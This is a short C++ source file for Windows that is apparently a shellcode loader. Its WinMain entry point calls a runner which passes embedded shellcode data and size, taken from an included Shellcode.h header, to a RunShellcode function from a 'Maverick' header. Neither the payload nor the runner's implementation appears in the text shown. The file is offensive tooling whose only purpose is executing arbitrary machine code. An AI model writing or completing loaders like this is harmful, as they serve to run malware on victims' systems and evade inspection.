#include <windows.h>
#define DLLEXPORT __declspec(dllexport)
#include <Maverick.h>
#include <Shellcode.h>

static auto Runner() -> void {
    RunShellcode(Shellcode::Data, Shellcode::Size);
}

auto WINAPI WinMain(
    _In_ HINSTANCE Instance,
    _In_ HINSTANCE PrevInstance,
    _In_ CHAR*     CommandLine,
    _In_ INT32     ShowCmd
) -> INT32 {
    Runner();
    return 0;
}
